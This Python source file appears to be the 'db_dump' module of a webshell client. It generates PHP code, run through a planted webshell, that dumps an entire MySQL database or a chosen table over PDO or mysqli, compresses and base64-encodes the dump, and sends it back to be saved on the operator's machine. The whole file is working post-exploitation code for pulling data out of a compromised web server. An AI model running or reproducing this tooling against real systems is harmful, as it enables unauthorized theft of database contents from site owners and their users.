from os import path, makedirs
from base64 import b64decode

from libs.config import alias, color, gget
from libs.myapp import send, get_db_connect_code, gzinflate



def get_php(database, table, encoding):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        return """set_time_limit(0); ignore_user_abort(1);
    function Tabledump($con,$table_name){
        $content="";
        $table_created_data = $con->query("show create table `$table_name`");
        $table_created_data_array = $table_created_data->fetch(PDO::FETCH_BOTH);
        $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".$table_created_data_array['Create Table'].";\\r\\n\\r\\n";
        $table_records = $con->query("select * from `$table_name`");
        while($record = $table_records->fetch(PDO::FETCH_ASSOC)){
            $keys = "`".join('`,`',array_map('addslashes',array_keys($record)))."`";
            $vals = "'".join("','",array_map('addslashes',array_values($record)))."'";
            $content .= "insert into `$table_name`($keys) values($vals);\\r\\n";
        }
        return $content;
    }
    function Sqldump(){
    $content = "DROP DATABASE IF EXISTS `%s`;\\r\\nCREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET %s;\\r\\nuse `%s`;\\r\\n";
    %s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $con->query("set names %s");
    $target_table="%s";
    if (empty($target_table)){
        $table_list = $con->query("show tables");
        while($table_data = $table_list->fetch(PDO::FETCH_BOTH)){
            $content .= Tabledump($con,$table_data[0])."\\r\\n";
        }
    }
    else {
        $content .= Tabledump($con,$target_table)."\\r\\n";
    }
    echo base64_encode(gzdeflate($content));
}
Sqldump();""" % (database, database, encoding, database, get_db_connect_code(dbname=database), encoding, table)
    elif (connect_type == "mysqli"):
        return """set_time_limit(0); ignore_user_abort(1);
        function Tabledump($con,$table_name){
        $content="";
        $table_created_data = mysqli_query($con,"show create table `$table_name`");
        $table_created_data_array = mysqli_fetch_array($table_created_data);
        $struct=str_replace("NOT NULL", "", $table_created_data_array['Create Table']);
        $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".$struct.";\\r\\n\\r\\n";
        $table_records = mysqli_query($con,"select * from `$table_name`");
        while($record = mysqli_fetch_assoc($table_records)){
            $vals = "'".join("','",array_map('mysql_real_escape_string',array_values($record)))."'";
            $content .= "insert into `$table_name` values($vals);\\r\\n";
        }
        return $content;
    }
    function Sqldump(){
    $content = "DROP DATABASE IF EXISTS `%s`;\\r\\nCREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET %s;\\r\\nuse `%s`;\\r\\n";
    %s
    if(!$con){
        die("Error : connect to mysql failed...");
    }
    mysqli_query($con,"set names %s");
    $target_table="%s";
    if (empty($target_table)){
        $table_list = mysqli_query($con,"show tables");
        while($table_data = mysqli_fetch_array($table_list)){
            $content .= Tabledump($con,$table_data[0])."\\r\\n";
        }
    } else {
        $content .= Tabledump($con,$target_table)."\\r\\n";
    }
    echo base64_encode(gzdeflate($content));
}
Sqldump();""" % (database, database, encoding, database, get_db_connect_code(dbname=database), encoding, table)



@alias(True, _type="DATABASE", db="database", t="table", l="local_path")
def run(database: str = "", table: str = "", local_path: str = "", encoding: str = "utf8"):
    """
    db_dump

    Dump a database or a table to a file, Default file name is {database}.sql.

    eg: db_dump {database=current_database} {local_path=doughnuts/target/site.com/{database}.sql} {encoding="utf-8"}
    """
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    database = database if database else gget("db_dbname", "webshell")
    download_path = local_path or gget("webshell.download_path", "webshell")
    if not path.exists(download_path):
        makedirs(download_path)
    file_name = f"{database}.sql" if (not table) else f"{database}.{table}.sql"
    res = send(get_php(database, table, encoding))
    if (not res):
        return
    text = res.r_text.strip()
    content = res.r_content.strip()
    if (len(text) > 0 and res.status_code == 200):
        file_path = path.join(download_path, file_name).replace("\\", "/")
        with open(file_path, "wb") as f:
            f.write(gzinflate(b64decode(content)))
        print("\n" + color.green(f"Dump {database} to {file_name} success") + "\n")
    elif ("Error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print(color.red("\nError\n"))
